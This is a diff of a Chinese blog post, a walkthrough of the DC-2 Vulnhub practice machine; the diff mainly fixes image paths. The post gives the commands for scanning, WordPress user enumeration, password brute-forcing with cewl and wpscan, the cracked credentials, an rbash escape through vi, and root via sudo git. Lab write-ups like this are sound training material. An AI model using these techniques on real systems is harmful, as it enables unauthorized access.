@@ -27,24 +27,24 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="前言DC:2-vulnhub渗透测试 靶机IP:192.168.1.170 kaLiIP:192.168.1.124">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
-<meta property="og:image" content="http://yoursite.com/.com//4.png">
-<meta property="og:image" content="http://yoursite.com/.com//5.png">
-<meta property="og:image" content="http://yoursite.com/.com//6.png">
-<meta property="og:image" content="http://yoursite.com/.com//7.png">
-<meta property="og:image" content="http://yoursite.com/.com//8.png">
-<meta property="og:image" content="http://yoursite.com/.com//9.png">
-<meta property="og:image" content="http://yoursite.com/.com//10.png">
-<meta property="og:image" content="http://yoursite.com/.com//11.png">
-<meta property="og:image" content="http://yoursite.com/.com//14.png">
-<meta property="og:image" content="http://yoursite.com/.com//15.png">
-<meta property="og:image" content="http://yoursite.com/.com//C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200228155525660.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200228155525660.png">
 <meta property="article:published_time" content="2020-03-04T09:08:12.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:15:49.769Z">
+<meta property="article:modified_time" content="2020-04-11T17:18:11.461Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="靶机渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//3.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
 
@@ -194,7 +194,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:15:49" itemprop="dateModified" datetime="2020-04-10T17:15:49+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:18:11" itemprop="dateModified" datetime="2020-04-12T01:18:11+08:00">2020-04-12</time>
               </span>
 
           
@@ -218,44 +218,44 @@
 <h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap扫描端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -A -p 1-65535 192.168.1.170</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//3.png" alt="image-20200228152255605"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="image-20200228152255605"></p>
 <p>这里有一个80端口的站点是wordpress</p>
 <p>访问80端口看一下，这里看到flag1</p>
-<p><img src="/.com//4.png" alt="image-20200228152836680"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="image-20200228152836680"></p>
 <p>这里说我们要用cewl获取一个字典文件。</p>
 <p>我们扫描一个这个站点，使用wpscan</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//5.png" alt="image-20200228153212655"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="image-20200228153212655"></p>
 <p>然后我们就接着生成字典，再去爆破一个这几个用户名</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w pass</span><br><span class="line">wpscan --url http://dc-2 -U admin/jerry/tom -P pass</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//6.png" alt="image-20200228153635619"></p>
-<p><img src="/.com//7.png" alt="image-20200228153739430"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" alt="image-20200228153635619"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="image-20200228153739430"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jerry / adipiscing   </span><br><span class="line">tom / parturient</span><br></pre></td></tr></table></figure>
 
 <p>然后用这两个账号登陆，tom这个账号没有可用的东西，然后在jerry这个账号中发现了flag2</p>
-<p><img src="/.com//8.png" alt="image-20200228153902313"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" alt="image-20200228153902313"></p>
 <p>说明wordpress没有可用的东西了</p>
 <p>思路转向ssh</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@<span class="number">192.168</span><span class="number">.1</span><span class="number">.170</span> -p <span class="number">7744</span></span><br><span class="line">  adipiscing</span><br></pre></td></tr></table></figure>
 
 <p>查看一下，发现能用的命令很少，tom 这是一个rbash</p>
-<p><img src="/.com//9.png" alt="image-20200228154252622"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" alt="image-20200228154252622"></p>
 <p>但是在tom中发现了flag3</p>
-<p><img src="/.com//10.png" alt="image-20200228154353684"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png" alt="image-20200228154353684"></p>
 <p>提示说使用su，但是rbash让我们很无力，所以使用vi来补全功能，获得新shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="number">1.</span>txt</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
 
 <p>通过export查看环境变量。</p>
-<p><img src="/.com//11.png" alt="image-20200228154909465"></p>
-<p><img src="/.com//14.png" alt="image-20200228154957211"></p>
-<p><img src="/.com//15.png" alt="image-20200228154957211"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" alt="image-20200228154909465"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png" alt="image-20200228154957211"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png" alt="image-20200228154957211"></p>
 <p>转到jerry用户，然后查看flag4.txt</p>
 <p>说是git提权</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help config</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200228155525660.png" alt="image-20200228155525660"></p>
+<p><img src="/2020/03/04/DC-2vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/C:%5CUsers%5Ccookie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200228155525660.png" alt="image-20200228155525660"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>vi修改shell要学习一下</p>
 
     </div>
@@ -360,7 +360,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
